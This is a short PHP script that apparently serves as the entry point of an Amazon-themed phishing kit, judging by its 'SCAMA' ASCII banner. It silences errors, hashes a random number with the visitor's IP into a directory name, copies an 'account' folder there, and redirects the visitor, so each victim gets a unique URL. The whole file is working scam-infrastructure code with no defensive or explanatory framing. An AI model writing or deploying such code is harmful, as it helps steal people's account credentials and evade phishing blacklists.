<?php
/* 
 _____  ________  ___ _____ _____ _   _ _____ _   _ _____    ___  ___  ___  ___   ___________ _   _   _____ _____   ___  ___  ___  ___  
/  ___||  _  |  \/  ||  ___|_   _| | | |_   _| \ | |  __ \  / _ \ |  \/  | / _ \ |___  /  _  | \ | | /  ___/  __ \ / _ \ |  \/  | / _ \ 
\ `--. | | | | .  . || |__   | | | |_| | | | |  \| | |  \/ / /_\ \| .  . |/ /_\ \   / /| | | |  \| | \ `--.| /  \// /_\ \| .  . |/ /_\ \
 `--. \| | | | |\/| ||  __|  | | |  _  | | | | . ` | | __  |  _  || |\/| ||  _  |  / / | | | | . ` |  `--. \ |    |  _  || |\/| ||  _  |
/\__/ /\ \_/ / |  | || |___  | | | | | |_| |_| |\  | |_\ \ | | | || |  | || | | |./ /__\ \_/ / |\  | /\__/ / \__/\| | | || |  | || | | |
\____/  \___/\_|  |_/\____/  \_/ \_| |_/\___/\_| \_/\____/ \_| |_/\_|  |_/\_| |_/\_____/\___/\_| \_/ \____/ \____/\_| |_/\_|  |_/\_| |_/
                                                                                                                                        
                                                                                                                                        
*/
session_start();
error_reporting(0);
$somerannum = rand(100000, 1000000) . $_SERVER['REMOTE_ADDR'];
$someranstr = substr(md5($somerannum), 0, 10);
function recurse_copy($someopen, $someranstr)
{
    $somefile = opendir($someopen);
    @mkdir($someranstr);
    while (false !== ($somelocal = readdir($somefile))) {
        if (($somelocal != '.') && ($somelocal != '..')) {
            if (is_dir($someopen . '/' . $somelocal)) {
                recurse_copy($someopen . '/' . $somelocal, $someranstr . '/' . $somelocal);
            } else {
                copy($someopen . '/' . $somelocal, $someranstr . '/' . $somelocal);
            }
        }
    }
    closedir($somefile);
}
$someopen = "account";
recurse_copy($someopen, $someranstr);
header("location:" . $someranstr . "");
unset($someranstr);
?>